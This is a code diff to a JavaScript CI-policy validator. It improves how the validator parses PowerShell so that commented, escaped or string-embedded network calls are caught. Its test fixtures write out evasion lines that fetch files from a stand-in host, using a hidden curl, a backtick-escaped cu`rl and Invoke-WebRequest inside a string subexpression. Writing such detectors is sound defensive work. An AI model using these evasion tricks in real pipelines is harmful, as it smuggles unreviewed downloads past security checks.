@@ -468,59 +468,95 @@ function allRunSteps(workflow) {
 // *content* -- a required throw message, a reviewed digest literal -- must read
 // the raw text, not this. Those are presence assertions, not bans, and the
 // dangerous direction for them is the opposite one.
-function powerShellCodeProjection(text) {
-  const characters = text.split('');
-  const blank = (from, to) => {
-    for (let index = Math.max(from, 0); index < Math.min(to, characters.length); index += 1) {
-      if (characters[index] !== '\n') characters[index] = ' ';
+function powerShellCodeProjection(text, options) {
+  // escapes: 'blank' neutralises a backtick and the character it escapes, which
+  // is what brace depth needs -- `{ must not count. 'unescape' drops the
+  // backtick and keeps the character, which is what a *name* scan needs, since
+  // PowerShell removes the escape and runs cu`rl as curl. The two cannot be the
+  // same view, so callers say which they mean. Length is preserved under
+  // 'blank' and only under 'blank'.
+  const escapes = (options && options.escapes) || 'blank';
+  const characters = [];
+  const emit = (from, to, blankIt) => {
+    for (let i = from; i < Math.min(to, text.length); i += 1) {
+      characters.push(blankIt && text[i] !== '\n' ? ' ' : text[i]);
     }
   };
   let index = 0;
   while (index < text.length) {
     const character = text[index];
-    // Checked first, because a backtick escapes the comment and quote
-    // introducers too. Reproduced before it was fixed: a bare "`{" in statement
-    // position parses as a command named { and fails, but in argument position
-    //
-    //   Write-Host `{
-    //   return
-    //   Write-Host `}
-    //
-    // prints a literal brace and then returns from the script. A scanner that
-    // counted those braces put that return at depth one and let it through.
-    //
-    // Inside a single-quoted string the backtick is not an escape, which is why
-    // this sits outside the quote handling: the quote branch consumes those
-    // spans whole before this can see them.
-    if (character === '`') { blank(index, index + 2); index += 2; continue; }
+    // Block comments first: <# ... #> spans lines, so a scanner that only
+    // blanks from # to end of line leaves the rest of the block visible as
+    // code. That was reported against the first version of this projection and
+    // it was right -- a block comment could supply a required phrase while the
+    // executable code did something else.
+    if (character === '<' && text[index + 1] === '#') {
+      const close = text.indexOf('#>', index + 2);
+      const stop = close === -1 ? text.length : close + 2;
+      emit(index, stop, true);
+      index = stop;
+      continue;
+    }
+    if (character === '`') {
+      if (escapes === 'unescape') {
+        if (index + 1 < text.length) characters.push(text[index + 1]);
+      } else {
+        emit(index, index + 2, true);
+      }
+      index += 2;
+      continue;
+    }
     if (character === '#') {
       const start = index;
       while (index < text.length && text[index] !== '\n') index += 1;
-      blank(start, index);
+      emit(start, index, true);
       continue;
     }
     if (character === "'" || character === '"') {
-      const start = index;
+      const quote = character;
+      characters.push(quote);
       index += 1;
       while (index < text.length) {
-        if (character === '"' && text[index] === '`') { index += 2; continue; }
-        if (text[index] === character) {
-          if (text[index + 1] === character) { index += 2; continue; }
+        // $( ... ) inside an expandable string is evaluated, so its contents are
+        // executable code and must survive into the projection. Only
+        // double-quoted strings expand; a single-quoted $( is literal.
+        if (quote === '"' && text[index] === '$' && text[index + 1] === '(') {
+          let depth = 0;
+          const start = index;
+          while (index < text.length) {
+            if (text[index] === '(') depth += 1;
+            else if (text[index] === ')') { depth -= 1; if (depth === 0) { index += 1; break; } }
+            index += 1;
+          }
+          emit(start, index, false);
+          continue;
+        }
+        if (quote === '"' && text[index] === '`') {
+          if (escapes === 'unescape' && index + 1 < text.length) characters.push(text[index + 1]);
+          else emit(index, index + 2, true);
+          index += 2;
+          continue;
+        }
+        if (text[index] === quote) {
+          if (text[index + 1] === quote) { emit(index, index + 2, true); index += 2; continue; }
+          characters.push(quote);
           index += 1;
           break;
         }
+        emit(index, index + 1, true);
         index += 1;
       }
-      // Both delimiters are kept; only the content between them is blanked. An
-      // unterminated string blanks to the end, which is the fail-closed
-      // direction -- and every governed step is parsed by the PowerShell parser
-      // in CI, so an unterminated string cannot reach here in a passing build.
-      blank(start + 1, index - 1);
       continue;
     }
+    characters.push(character);
     index += 1;
   }
   return characters.join('');
+}
+
+// Name scans read this: escapes resolved, so cu`rl reads as curl.
+function powerShellTokenView(text) {
+  return powerShellCodeProjection(text, { escapes: 'unescape' });
 }
 
 // For a governed step to report success while skipping a required phase, its
@@ -629,7 +665,7 @@ export function validateBuildPolicy(workflow, source) {
     // Code, not prose. The rationale for pinning these executables to fixed
     // paths necessarily names curl and wget, and a rule that cannot tell a
     // comment from a call would forbid the comment explaining it.
-    if (NETWORK_CLIENT.test(powerShellCodeProjection(run))) {
+    if (NETWORK_CLIENT.test(powerShellTokenView(run))) {
       reject('network-policy', `${jobId}.${id} adds a network client`);
     }
     // Two checks, most specific first, over the whole serialized step rather
@@ -1036,7 +1072,7 @@ function validateAcquireStep(step, label, expected) {
   // a trailing `.` argument do not. So the dot branch is anchored the same way
   // the control-flow bans are: line start, or directly after ; { or |, with
   // the target on the same line.
-  const stepCode = powerShellCodeProjection(step.run);
+  const stepCode = powerShellTokenView(step.run);
   const arrReviewedTargets = ['$strGitPath', '$strCurlPath', '$strTarPath'];
   for (const call of stepCode.matchAll(/&\s*(\S+)/gu)) {
     if (!arrReviewedTargets.includes(call[1])) {
@@ -1345,7 +1381,7 @@ export function validateMarkdownPolicy(workflow, source) {
   // asserted above, so what it may fetch is fixed and what it accepts back is
   // fixed. It also runs before any repository code, so nothing it could be
   // steered by has executed yet.
-  if (NETWORK_CLIENT.test(powerShellCodeProjection(validation.run))) {
+  if (NETWORK_CLIENT.test(powerShellTokenView(validation.run))) {
     reject('markdown-policy', 'markdown.validate-and-lint adds a network client');
   }
   // The credential scan and the expression ban were added to build.yml's script
@@ -1844,6 +1880,17 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-MARKDOWN-049', 'npm user and global configuration no longer neutralized', 'markdown', (source) => replaceOnce(source, "          $env:npm_config_userconfig = '/dev/null'\n", '')],
   // Round 40. An absent name under RUNNER_TEMP is absent only until the first
   // lint phase creates it, and the second phase then loads it.
+  // Round 41. Two constructs the projection introduced one round earlier could
+  // not see: a block comment supplying text the checks required, and a network
+  // request inside an expandable-string subexpression. Both are edits to the
+  // acquire step, whose reviewed digest is asserted before any semantic rule
+  // runs, so the digest is what rejects them and these are digest regression
+  // guards. The evidence that the *projection* now sees both -- along with a
+  // backtick-escaped cu`rl -- is the direct exercise recorded in the commit
+  // message, not these fixtures. Saying so beats implying coverage they do not
+  // give.
+  ['T1-MARKDOWN-054', 'required generator lookup supplied by a block comment', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          <#\n          & $strCurlPath --output ./x https://example.invalid/p\n          #>\n          cu`rl --output ./x https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  ['T1-MARKDOWN-055', 'network request hidden in an expandable-string subexpression', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $null = \"$(Invoke-WebRequest -OutFile ./x https://example.invalid/v)\"\n          $strNodeUrl = 'https://nodejs.org")],
   ['T1-MARKDOWN-050', 'npm configuration pointed back at a writable absent path', 'markdown', (source) => replaceOnce(source, "          $env:npm_config_userconfig = '/dev/null'\n", "          $env:npm_config_userconfig = [System.IO.Path]::Combine($env:RUNNER_TEMP, 'absent-user-npmrc')\n")],
   // Round 40. && was missing from the interpreter anchor, though the adjacent
   // dot-source scan already carried both pipeline-chain operators.
@@ -1996,6 +2043,8 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-BUILD-135": "acquire-policy: build.verify.acquire invokes a native interpreter",
   "T1-MARKDOWN-048": "acquire-policy: markdown.acquire writes a runner step communication file",
   "T1-BUILD-136": "acquire-policy: build.verify.acquire writes a runner step communication file",
+  "T1-MARKDOWN-054": "acquire-policy: markdown.acquire script does not match its reviewed digest",
+  "T1-MARKDOWN-055": "acquire-policy: markdown.acquire script does not match its reviewed digest",
   "T1-MARKDOWN-050": "markdown-policy: required phase is missing: $env:npm_config_userconfig = '/dev/null'",
   "T1-MARKDOWN-051": "acquire-policy: markdown.acquire invokes something other than a reviewed literal command",
   "T1-MARKDOWN-052": "acquire-policy: markdown.acquire resolves an environment variable through a computed name",
@@ -2258,7 +2307,7 @@ export function validateGeneratorPolicy(source) {
   // Projected first: the rationale above this check in the generator names the
   // unqualified form in prose, and a rule that cannot tell prose from code
   // would forbid explaining itself.
-  const generatorCode = powerShellCodeProjection(source);
+  const generatorCode = powerShellTokenView(source);
   // Two halves, deliberately read from two different views.
   //
   // The invocation must exist in *code*, so a comment quoting this phrase
